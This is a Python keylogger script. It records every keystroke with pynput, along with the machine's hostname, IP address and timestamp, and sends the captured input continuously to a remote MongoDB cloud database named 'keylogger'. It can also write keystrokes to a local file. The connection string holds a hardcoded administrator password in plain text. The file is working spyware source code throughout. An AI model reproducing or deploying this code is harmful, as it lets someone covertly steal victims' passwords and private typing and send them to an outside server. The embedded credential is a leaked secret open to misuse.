from pynput import keyboard
import pymongo
from pprint import pprint
from datetime import datetime
import socket


# Get private details of user to track
now = datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

# Current Session's content array creation
content = []

# MongoDB connection and creating keylogger Database
client = pymongo.MongoClient("mongodb+srv://Admin:ARUNonmongodb97!@cluster-01-bymsn.azure.mongodb.net/Cluster-01?retryWrites=true&w=majority")
db = client.keylogger
# serverStatusResult = db.command("serverStatus")
# pprint(serverStatusResult)

# Collection creation
db.logs.insert_one(
    {"Datetime": dt_string,
     "IP address": ip_address,
     "Content": []})


def updateDB(cont):
    db.logs.update_one(
        {"Datetime": dt_string},
        {"$set": {"content": cont}})


def readRB():
    data = db.logs.find({})
    for info in data:
        pprint(info)


def write(log):
    content.append(log)
    updateDB(content)


def writeChar(log):
    f = open("data.txt", "a+")
    f.write(log)
    f.close()


def writeAttr(log):
    f = open("data.txt", "a+")
    f.write("\n" + log + "\n")
    f.close()


def on_press(key):
    try:
        # print("key char: " + str(key.char))
        write(str(key.char))
        # writeChar(str(key.char))
    except AttributeError:
        # print("key: " + str(key))
        write(str(key))
        # writeAttr(str(key))


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        readRB()
        return False


with keyboard.Listener(
        on_press=on_press, on_release=on_release) as listener:
    listener.join()

